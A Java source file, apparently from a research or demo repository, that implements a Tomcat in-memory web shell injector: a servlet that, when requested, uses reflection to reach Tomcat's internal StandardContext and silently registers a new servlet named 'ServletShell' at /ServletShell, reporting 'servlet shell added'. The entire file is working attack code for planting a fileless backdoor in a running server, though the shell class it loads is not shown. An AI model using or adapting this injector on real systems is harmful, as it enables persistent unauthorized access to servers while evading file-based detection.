package cc.saferoad.servlet.servletmemshell;/*
@auther S0cke3t
@date 2021-12-29
*/

import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.lang.reflect.Field;

@WebServlet(name = "ServletShellIndex", value = "/ServletShellIndex")
public class ServletShellIndex extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        doPost(request, response);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try {
            String servletName = "ServletShell";
            String urlPattern = "/ServletShell";
            ServletContext servletContext = request.getServletContext();
            //判断是否已添加相同名称servlet
            if (servletContext.getServletRegistration(servletName) == null) {
                StandardContext standardContext = null;
                // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                while (standardContext == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object object = f.get(servletContext);

                    if (object instanceof ServletContext) {
                        servletContext = (ServletContext) object;
                    } else if (object instanceof StandardContext) {
                        standardContext = (StandardContext) object;
                    }
                }
                Class<?> servletClass = cc.saferoad.servlet.servletmemshell.ServletShellDemo.class;
                response.getWriter().println(servletClass);
                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(servletName);
                wrapper.setLoadOnStartup(1);
                wrapper.setServlet((Servlet) servletClass.newInstance());
                wrapper.setServletClass(servletClass.getName());
                standardContext.addChild(wrapper);
                standardContext.addServletMapping(urlPattern, servletName);
                response.getWriter().println("servlet shell added");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
